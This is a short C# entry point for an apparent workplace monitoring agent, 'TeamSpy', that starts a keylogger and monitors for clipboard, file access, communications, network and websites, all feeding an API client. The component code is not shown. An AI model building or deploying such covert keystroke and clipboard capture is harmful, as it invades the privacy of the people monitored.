using Microsoft.Win32;

namespace TeamSpy.Agent
{
    class Program
    {
        private static ApiClient? _apiClient;

        static void Main(string[] args)
        {
            _apiClient = new ApiClient();

            Console.WriteLine("Starting TeamSpy Agent for monitoring...");

            var appTracker = new ApplicationTracker(_apiClient);
            var webMonitor = new WebsiteMonitor(_apiClient);
            var keyLogger = new KeyLogger(_apiClient);
            var clipboardMonitor = new ClipboardMonitor(_apiClient);
            var fileAccessMonitor = new FileAccessMonitor(_apiClient);
            var communicationMonitor = new CommunicationMonitor(_apiClient);
            var networkMonitor = new NetworkMonitor(_apiClient);

            appTracker.Start();
            webMonitor.Start();
            keyLogger.Start();
            clipboardMonitor.Start();
            fileAccessMonitor.Start();
            communicationMonitor.Start();
            networkMonitor.Start();

            Console.WriteLine("Agent is running. Press Enter to exit.");
            Console.ReadLine(); // Keep the agent running

            // Stop services gracefully
            networkMonitor.Stop();
            communicationMonitor.Stop();
            fileAccessMonitor.Stop();
            clipboardMonitor.Stop();
            keyLogger.Stop();
            webMonitor.Stop();
            appTracker.Stop();
            Console.WriteLine("TeamSpy Agent stopped.");
        }
    }
}
